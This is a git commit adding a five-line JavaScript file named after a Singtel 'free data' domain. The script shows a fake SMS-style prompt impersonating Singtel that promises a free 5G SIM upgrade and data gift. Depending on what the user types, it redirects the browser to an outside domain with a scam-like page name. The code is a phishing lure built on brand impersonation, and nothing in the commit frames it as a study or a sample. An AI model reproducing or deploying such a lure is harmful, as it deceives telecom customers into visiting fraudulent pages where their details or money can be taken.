e3373e6b5dad96920c90de6dffcbb4b0174fdd0e
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-05 04:22:29 -0700

    Create singtel-freedata.com.js

---
+++ singtel-freedata.com.js
@@ -0,0 +1,5 @@
+var password = 'Free Gift Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive Free Data 5G UPGRADE SIM CARD GIFT, Kindly Press OK to ACTIVATE From Singtel. ','Free Gift Data');
+if (password != 'Free Gift Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
